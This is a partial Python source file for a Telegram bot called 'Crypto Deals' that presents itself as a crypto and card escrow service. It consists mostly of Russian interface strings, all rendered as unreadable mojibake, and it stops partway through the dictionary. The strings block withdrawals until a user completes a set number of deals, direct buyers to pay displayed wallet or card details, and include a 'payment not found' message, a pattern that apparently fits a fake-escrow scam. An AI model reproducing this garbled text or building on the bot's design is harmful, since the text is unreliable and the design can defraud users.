import logging
import random
import string
import asyncio
import sys
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.error import Conflict, NetworkError

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ------------------ –ö–û–î–´ –Ø–ó–´–ö–û–í ------------------
LANG_RU = 'ru'
LANG_EN = 'en'

# ------------------ –õ–û–ö–ê–õ–ò–ó–ê–¶–ò–Ø ------------------
TEXTS = {
    LANG_RU: {
        # ---------- –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é –∏ –Ω–∞–≤–∏–≥–∞—Ü–∏—è ----------
        'welcome': (
            "–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å üëã\n\n"
            "üíº Crypto Deals - –ú—ã —Å–ø–µ—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Å–µ—Ä–≤–∏—Å –ø–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—é –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤–Ω–µ –±–∏—Ä–∂–µ–≤—ã—Ö —Å–¥–µ–ª–æ–∫.\n\n"
            "‚ú® –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω—ã–π –∞–ª–≥–æ—Ä–∏—Ç–º –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è.\n"
            "‚ö°Ô∏è –°–∫–æ—Ä–æ—Å—Ç—å –∏ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è.\n"
            "üí≥ –£–¥–æ–±–Ω—ã–π –∏ –±—ã—Å—Ç—Ä—ã–π –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤.\n\n"
            "‚Ä¢ –ö–æ–º–∏—Å—Å–∏—è —Å–µ—Ä–≤–∏—Å–∞: 1%\n"
            "‚Ä¢ –†–µ–∂–∏–º —Ä–∞–±–æ—Ç—ã: 24/7\n"
            "‚Ä¢ –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞: @CryptoDealsEscrow\n\n"
            "üõ°Ô∏è –í—ã–±–µ—Ä–∏—Ç–µ –Ω—É–∂–Ω—ã–π —Ä–∞–∑–¥–µ–ª –Ω–∏–∂–µ:"
        ),
        'choose_language': "üåê –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ —è–∑—ã–∫:",
        'language_selected': "‚úÖ –Ø–∑—ã–∫ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: –†—É—Å—Å–∫–∏–π",
        'back_to_menu': "üîô –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é",

        # ---------- –ö–Ω–æ–ø–∫–∏ –≥–ª–∞–≤–Ω–æ–≥–æ –º–µ–Ω—é ----------
        'btn_manage_requisites': "üì©–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º–∏",
        'btn_create_deal': "üìù–°–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É",
        'btn_my_balance': "üí∞–ú–æ–π –±–∞–ª–∞–Ω—Å",
        'btn_referral': "üîó–†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞",
        'btn_support': "üìû–ü–æ–¥–¥–µ—Ä–∂–∫–∞",

        # ---------- –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º–∏ ----------
        'manage_requisites': "üì• –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º–∏\n\n–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ —á—Ç–æ–±—ã –¥–æ–±–∞–≤–∏—Ç—å/–∏–∑–º–µ–Ω–∏—Ç—å —Ä–µ–∫–≤–∏–∑–∏—Ç—ãüëá",
        'btn_add_wallet': "ü™ô–î–æ–±–∞–≤–∏—Ç—å/–∏–∑–º–µ–Ω–∏—Ç—å TON-–ö–æ—à–µ–ª–µ–∫",
        'btn_add_card': "üí≥–î–æ–±–∞–≤–∏—Ç—å/–∏–∑–º–µ–Ω–∏—Ç—å –∫–∞—Ä—Ç—É",

        # ---------- –°–æ–∑–¥–∞–Ω–∏–µ —Å–¥–µ–ª–∫–∏ ----------
        'create_deal_prompt': "üí∞–í—ã–±–µ—Ä–∏—Ç–µ –º–µ—Ç–æ–¥ –ø–æ–ª—É—á–µ–Ω–∏—è –æ–ø–ª–∞—Ç—ã:",
        'btn_deal_ton': "üíé–ù–∞ TON-–∫–æ—à–µ–ª–µ–∫",
        'btn_deal_card': "üí≥–ù–∞ –∫–∞—Ä—Ç—É",
        'btn_deal_stars': "‚≠êÔ∏è–ó–≤–µ–∑–¥—ã",
        'enter_amount': "üíº –°–æ–∑–¥–∞–Ω–∏–µ —Å–¥–µ–ª–∫–∏\n\n–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É {unit} –≤ —Ñ–æ—Ä–º–∞—Ç–µ: 100.5",
        'enter_description': "üìù –£–∫–∞–∂–∏—Ç–µ, —á—Ç–æ –≤—ã –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç–µ –≤ —ç—Ç–æ–π —Å–¥–µ–ª–∫–µ –∑–∞ {amount} {unit}:\n\n–ü—Ä–∏–º–µ—Ä: 10 –ö–µ–ø–æ–∫ –∏ –ü–µ–ø–µ...",
        'invalid_amount': "‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Å—É–º–º—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç 100.5 {unit}",
        'deal_created': (
            "‚úÖ –°–¥–µ–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞!\n\n"
            "üí∞ –°—É–º–º–∞: {amount} {unit}\n"
            "üí± –í–∞–ª—é—Ç–∞: {currency}\n"
            "üìú –û–ø–∏—Å–∞–Ω–∏–µ: {description}\n"
            "üîó –°—Å—ã–ª–∫–∞ –¥–ª—è –ø–æ–∫—É–ø–∞—Ç–µ–ª—è:\n"
            "{link}\n\n"
            "–°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Å—Å—ã–ª–∫—É –∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –ø–æ–∫—É–ø–∞—Ç–µ–ª—é."
        ),

        # ---------- –ë–∞–ª–∞–Ω—Å –∏ –≤—ã–≤–æ–¥ ----------
        'my_balance': (
            "üí∞ –í–ê–® –ë–ê–õ–ê–ù–°\n\n"
            "üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username}\n"
            "üíµ –ë–∞–ª–∞–Ω—Å: {balance:.2f} —Ä—É–±\n\n"
            "üí≥ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –≤—ã–≤–æ–¥–µ —Å—Ä–µ–¥—Å—Ç–≤:\n"
            "{wallet_info}\n"
            "{card_info}\n\n"
            "üìã **–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:**\n"
            "‚Ä¢ –ö–æ–º–∏—Å—Å–∏—è —Å–∏—Å—Ç–µ–º—ã: {fee}%\n"
            "‚Ä¢ –ú–∏–Ω. —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: {min_withdraw} —Ä—É–±\n"
            "{deals_requirement}"
            "‚Ä¢ –í—ã–≤–æ–¥ –¥–æ—Å—Ç—É–ø–µ–Ω –Ω–∞ –∫–∞—Ä—Ç—É –∏–ª–∏ TON-–∫–æ—à–µ–ª–µ–∫\n\n"
            "üíº –£—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫: {deals}"
        ),
        'btn_withdraw': "üí≥ –í—ã–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞",
        'btn_history': "üìä –ò—Å—Ç–æ—Ä–∏—è –æ–ø–µ—Ä–∞—Ü–∏–π",
        'withdraw_funds': (
            "üí∞ –í–´–í–û–î –°–†–ï–î–°–¢–í\n\n"
            "üíµ –î–æ—Å—Ç—É–ø–Ω–æ –∫ –≤—ã–≤–æ–¥—É: {balance:.2f} —Ä—É–±\n"
            "üìã –ú–∏–Ω. —Å—É–º–º–∞: {min_withdraw} —Ä—É–±\n"
            "{deals_requirement}"
            "–í—ã–±–µ—Ä–∏—Ç–µ —Å–ø–æ—Å–æ–± –≤—ã–≤–æ–¥–∞:"
        ),
        'btn_withdraw_card': "üí≥ –ù–∞ –∫–∞—Ä—Ç—É",
        'btn_withdraw_wallet': "ü™ô –ù–∞ TON-–∫–æ—à–µ–ª–µ–∫",
        'insufficient_balance': (
            "‚ùå –ù–ï–î–û–°–¢–ê–¢–û–ß–ù–û –°–†–ï–î–°–¢–í –î–õ–Ø –í–´–í–û–î–ê!\n\n"
            "üíµ –í–∞—à –±–∞–ª–∞–Ω—Å: {balance:.2f} —Ä—É–±\n"
            "üí∞ –ú–∏–Ω. —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: {min_withdraw} —Ä—É–±\n"
            "üí∏ –ù–µ —Ö–≤–∞—Ç–∞–µ—Ç: {need:.2f} —Ä—É–±"
        ),
        'withdraw_to_card': (
            "üí≥ –í–´–í–û–î –ù–ê –ö–ê–†–¢–£\n\n"
            "üè¶ –ö–∞—Ä—Ç–∞: <code>{card}</code>\n"
            "üìä –°—Ç–∞—Ç—É—Å: {status_text}\n"
            "üíµ –î–æ—Å—Ç—É–ø–Ω–æ: {balance:.2f} —Ä—É–±\n"
            "üí∞ –ú–∏–Ω. —Å—É–º–º–∞: {min_withdraw} —Ä—É–±\n\n"
            "üìù –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞ –≤ —Ä—É–±–ª—è—Ö:"
        ),
        'withdraw_to_wallet': (
            "ü™ô –í–´–í–û–î –ù–ê TON-–ö–û–®–ï–õ–ï–ö\n\n"
            "üè¶ –ö–æ—à–µ–ª–µ–∫: <code>{wallet}</code>\n"
            "üìä –°—Ç–∞—Ç—É—Å: {status_text}\n"
            "üíµ –î–æ—Å—Ç—É–ø–Ω–æ: {balance:.2f} —Ä—É–±\n"
            "üí∞ –ú–∏–Ω. —Å—É–º–º–∞: {min_withdraw} —Ä—É–±\n\n"
            "üìù –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞ –≤ —Ä—É–±–ª—è—Ö:"
        ),
        'withdraw_immediate': "‚úÖ –í—ã–≤–æ–¥ —Å—Ä–∞–∑—É (–Ω–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å)",
        'withdraw_needed': "‚è≥ –ù—É–∂–Ω–æ –µ—â—ë {needed} —Å–¥–µ–ª–æ–∫",
        'withdraw_available': "‚úÖ –í—ã–≤–æ–¥ –¥–æ—Å—Ç—É–ø–µ–Ω",
        'withdraw_deficit': (
            "‚è≥ –î–õ–Ø –í–´–í–û–î–ê –ù–ï–û–ë–•–û–î–ò–ú–û –ü–†–û–í–ï–°–¢–ò –ï–©–Å {needed} –£–°–ü–ï–®–ù–´–• –°–î–ï–õ–û–ö\n\n"
            "üíµ –í–∞—à –±–∞–ª–∞–Ω—Å: {balance:.2f} —Ä—É–±\n"
            "üí∞ –ú–∏–Ω. —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: {min_withdraw} —Ä—É–±\n"
            "üíº –í–∞—à–∏ —É—Å–ø–µ—à–Ω—ã–µ —Å–¥–µ–ª–∫–∏: {deals}\n"
            "üìä –¢—Ä–µ–±—É–µ—Ç—Å—è: {min_deals}"
        ),
        'deals_requirement': "‚Ä¢ –î–ª—è –≤—ã–≤–æ–¥–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∏–º–µ—Ç—å {min_deals} —É—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫\n",
        'no_card': "‚ùå –ö–∞—Ä—Ç–∞ –Ω–µ –¥–æ–±–∞–≤–ª–µ–Ω–∞",
        'no_wallet': "‚ùå TON-–∫–æ—à–µ–ª–µ–∫ –Ω–µ –¥–æ–±–∞–≤–ª–µ–Ω",
        'withdraw_success': (
            "‚úÖ –ó–ê–Ø–í–ö–ê –ù–ê –í–´–í–û–î –ü–†–ò–ù–Ø–¢–ê!\n\n"
            "üíµ –°—É–º–º–∞: {amount:.2f} —Ä—É–±\n"
            "üìã –°–ø–æ—Å–æ–±: {method}\n"
            "üìù –†–µ–∫–≤–∏–∑–∏—Ç—ã: {details}\n\n"
            "‚è≥ –ó–∞—è–≤–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫—É –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É.\n"
            "–û–±—ã—á–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–Ω–∏–º–∞–µ—Ç –¥–æ 24 —á–∞—Å–æ–≤.\n\n"
            "üè¶ –¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: {balance:.2f} —Ä—É–±\n\n"
            "üìû –ü—Ä–∏ –≤–æ–∑–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏–∏ –≤–æ–ø—Ä–æ—Å–æ–≤ –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É."
        ),
        'withdraw_error': (
            "‚ùå **–û–®–ò–ë–ö–ê –ü–†–ò –û–ë–†–ê–ë–û–¢–ö–ï –í–´–í–û–î–ê!**\n\n"
            "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ –∏–ª–∏ –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É."
        ),
        'transaction_history': "üìä **–ò–°–¢–û–†–ò–Ø –û–ü–ï–†–ê–¶–ò–ô**\n\n–†–∞–∑–¥–µ–ª –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ.",

        # ---------- –î–æ–±–∞–≤–ª–µ–Ω–∏–µ —Ä–µ–∫–≤–∏–∑–∏—Ç–æ–≤ ----------
        'add_wallet_prompt': (
            "üîë –î–æ–±–∞–≤—å—Ç–µ –≤–∞—à TON-–∫–æ—à–µ–ª–µ–∫:\n\n"
            "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∞–¥—Ä–µ—Å –≤–∞—à–µ–≥–æ –∫–æ—à–µ–ª—å–∫–∞\n\n"
            "üìù –í–∞–∂–Ω–æ:\n"
            "‚Ä¢ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: {min_withdraw} —Ä—É–±"
        ),
        'add_wallet_change': (
            "üîë –í–∞—à —Ç–µ–∫—É—â–∏–π TON-–∫–æ—à–µ–ª–µ–∫:\n<code>{wallet}</code>\n\n"
            "üìä –°—Ç–∞—Ç—É—Å: {status}\n\n"
            "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–≤—ã–π –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞ –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –º–µ–Ω—é.\n\n"
            "üìù –ü—Ä–∞–≤–∏–ª–∞ –≤—ã–≤–æ–¥–∞:\n"
            "‚Ä¢ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: {min_withdraw} —Ä—É–±"
        ),
        'add_card_prompt': (
            "üí≥ –î–æ–±–∞–≤—å—Ç–µ –≤–∞—à—É –∫–∞—Ä—Ç—É:\n\n"
            "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–º–µ—Ä –≤–∞—à–µ–π –∫–∞—Ä—Ç—ã\n\n"
            "üìù –í–∞–∂–Ω–æ:\n"
            "‚Ä¢ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: {min_withdraw} —Ä—É–±"
        ),
        'add_card_change': (
            "üí≥ –í–∞—à —Ç–µ–∫—É—â–∏–π –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:\n<code>{card}</code>\n\n"
            "üìä –°—Ç–∞—Ç—É—Å: {status}\n\n"
            "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–≤—ã–π –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –º–µ–Ω—é.\n\n"
            "üìù –ü—Ä–∞–≤–∏–ª–∞ –≤—ã–≤–æ–¥–∞:\n"
            "‚Ä¢ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: {min_withdraw} —Ä—É–±"
        ),
        'wallet_saved': (
            "‚úÖ TON-–∫–æ—à–µ–ª–µ–∫ —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω!\n\n"
            "üîë –í–∞—à —Ç–µ–∫—É—â–∏–π TON-–∫–æ—à–µ–ª–µ–∫:\n<code>{wallet}</code>\n\n"
            "üìù –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –≤—ã–≤–æ–¥–µ:\n"
            "‚Ä¢ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: {min_withdraw} —Ä—É–±\n"
            "‚Ä¢ –ö–æ–º–∏—Å—Å–∏—è —Å–∏—Å—Ç–µ–º—ã: {fee}%\n\n"
            "üíº –í–∞—à–µ —Ç–µ–∫—É—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —É—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫: {deals}"
        ),
        'card_saved': (
            "‚úÖ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω!\n\n"
            "üí≥ –í–∞—à —Ç–µ–∫—É—â–∏–π –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:\n<code>{card}</code>\n\n"
            "üìù –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –≤—ã–≤–æ–¥–µ:\n"
            "‚Ä¢ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: {min_withdraw} —Ä—É–±\n"
            "‚Ä¢ –ö–æ–º–∏—Å—Å–∏—è —Å–∏—Å—Ç–µ–º—ã: {fee}%\n\n"
            "üíº –í–∞—à–µ —Ç–µ–∫—É—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —É—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫: {deals}"
        ),
        'invalid_wallet': "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ—à–µ–ª—å–∫–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –∞–¥—Ä–µ—Å –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.",
        'invalid_card': "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞ –∫–∞—Ä—Ç—ã. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –Ω–æ–º–µ—Ä –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.",

        # ---------- –°–¥–µ–ª–∫–∏ (–ø–æ–∫—É–ø–∞—Ç–µ–ª—å) ----------
        'deal_info_buyer': (
            "üí≥ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–¥–µ–ª–∫–µ #{deal_id}\n\n"
            "üë§ –í—ã –ø–æ–∫—É–ø–∞—Ç–µ–ª—å –≤ —Å–¥–µ–ª–∫–µ.\n"
            "üìå –ü—Ä–æ–¥–∞–≤–µ—Ü: @{seller}\n\n"
            "üì¶ –í—ã –ø–æ–∫—É–ø–∞–µ—Ç–µ: {description}\n\n"
            "{payment_info}\n"
            "üí∞ –°—É–º–º–∞ –∫ –æ–ø–ª–∞—Ç–µ: {amount} {unit}\n\n"
            "{warning}"
        ),
        'payment_info_ton': (
            "üè¶ –ê–¥—Ä–µ—Å –¥–ª—è –æ–ø–ª–∞—Ç—ã:\n"
            "<code>{wallet}</code>\n\n"
            "üìù –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π –∫ –ø–ª–∞—Ç–µ–∂—É (–º–µ–º–æ):\n"
            "<code>{deal_id}</code>\n\n"
        ),
        'payment_info_card': (
            "üè¶ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã –¥–ª—è –æ–ø–ª–∞—Ç—ã:\n"
            "<code>{card}</code>\n\n"
            "üìù –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ –ø–ª–∞—Ç–µ–∂–∞:\n"
            "<code>{deal_id}</code>\n\n"
        ),
        'payment_info_stars': (
            "üè¶ –°–ø–æ—Å–æ–± –æ–ø–ª–∞—Ç—ã: {currency}\n\n"
            "üìù ID —Å–¥–µ–ª–∫–∏: <code>{deal_id}</code>\n\n"
        ),
        'warning_ton': (
            "‚ö†Ô∏è –í–ê–ñ–ù–û: –ü—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–ª–∞—Ç–µ–∂–∞ –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û —É–∫–∞–∂–∏—Ç–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π (–º–µ–º–æ) –∫–∞–∫ —É–∫–∞–∑–∞–Ω–æ –≤—ã—à–µ!\n\n"
            "üìå –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –ø–æ –æ–ø–ª–∞—Ç–µ:\n"
            "1. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –∞–¥—Ä–µ—Å TON-–∫–æ—à–µ–ª—å–∫–∞\n"
            "2. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π (–º–µ–º–æ)\n"
            "3. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–æ—á–Ω—É—é —Å—É–º–º—É {amount} TON\n"
            "4. –í—Å—Ç–∞–≤—å—Ç–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π –≤ –ø–æ–ª–µ 'Memo' / '–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π'\n\n"
            "‚ùå –ë–ï–ó –ö–û–ú–ú–ï–ù–¢–ê–†–ò–Ø –ü–õ–ê–¢–ï–ñ –ù–ï –ë–£–î–ï–¢ –ó–ê–ß–ò–°–õ–ï–ù!\n"
            "–í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –∑–∞–ø–æ–ª–Ω–∏—Ç–µ —Ñ–æ—Ä–º—É ‚Äî @CryptoDealsEscrow"
        ),
        'warning_card': (
            "‚ö†Ô∏è –í–ê–ñ–ù–û: –ü—Ä–∏ –ø–µ—Ä–µ–≤–æ–¥–µ –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û —É–∫–∞–∂–∏—Ç–µ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ –ø–ª–∞—Ç–µ–∂–∞ –∫–∞–∫ —É–∫–∞–∑–∞–Ω–æ –≤—ã—à–µ!\n\n"
            "üìå –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –ø–æ –æ–ø–ª–∞—Ç–µ:\n"
            "1. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã\n"
            "2. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ –ø–ª–∞—Ç–µ–∂–∞\n"
            "3. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–æ—á–Ω—É—é —Å—É–º–º—É {amount} ‚ÇΩ\n"
            "4. –í—Å—Ç–∞–≤—å—Ç–µ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ –ø–ª–∞—Ç–µ–∂–∞ –≤ –ø–æ–ª–µ '–ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ' / '–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π'\n\n"
            "‚ùå –ë–ï–ó –ü–†–ê–í–ò–õ–¨–ù–û–ì–û –ù–ê–ó–ù–ê–ß–ï–ù–ò–Ø –ü–õ–ê–¢–ï–ñ –ù–ï –ë–£–î–ï–¢ –ó–ê–ß–ò–°–õ–ï–ù!\n"
            "–í —Å–ª—É—á–∞–µ –ø—Ä–æ–±–ª–µ–º —Å –æ–ø–ª–∞—Ç–æ–π –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É ‚Äî @CryptoDealsEscrow"
        ),
        'warning_stars': (
            "‚ö†Ô∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —Å–ª–µ–¥—É–π—Ç–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è–º –ø—Ä–æ–¥–∞–≤—Ü–∞ –ø–æ –æ–ø–ª–∞—Ç–µ.\n"
            "–°–æ—Ö—Ä–∞–Ω–∏—Ç–µ ID —Å–¥–µ–ª–∫–∏ –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è!\n\n"
            "–í —Å–ª—É—á–∞–µ –ø—Ä–æ–±–ª–µ–º —Å –æ–ø–ª–∞—Ç–æ–π –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É ‚Äî @CryptoDealsEscrow"
        ),
        'btn_confirm_payment': "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –æ–ø–ª–∞—Ç—É",
        'btn_exit_deal': "‚ùå –í—ã–π—Ç–∏ —Å–æ —Å–¥–µ–ª–∫–∏",
        'payment_confirmed_unauthorized': (
            "‚è≥ –û–ü–õ–ê–¢–ê –ù–ê –ü–†–û–í–ï–†–ö–ï\n\n"
            "‚úÖ –í—ã –Ω–∞–∂–∞–ª–∏ –∫–Ω–æ–ø–∫—É –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ–ø–ª–∞—Ç—ã.\n"
            "üí∞ –°—É–º–º–∞: {amount} {unit}\n"
            "üì¶ –¢–æ–≤–∞—Ä: {description}\n"
            "üîó ID —Å–¥–µ–ª–∫–∏: #{deal_id}\n\n"
            "‚ùå –û–ø–ª–∞—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞\n"
            "‚è≥ –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –æ–ø–ª–∞—Ç—ã –≤ —Ç–µ—á–µ–Ω–∏–µ 10 –º–∏–Ω—É—Ç.\n\n"
            "üìå –î–∞–ª—å–Ω–µ–π—à–∏–µ –¥–µ–π—Å—Ç–≤–∏—è:\n"
            "1. –ü–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –æ–ø–ª–∞—Ç—ã —Å—Ä–µ–¥—Å—Ç–≤–∞ –±—É–¥—É—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞—á–∏—Å–ª–µ–Ω—ã\n"
            "2. –ü—Ä–æ–¥–∞–≤–µ—Ü –ø–æ–ª—É—á–∏—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –≤–∞—à–µ–º –ø–ª–∞—Ç–µ–∂–µ\n"
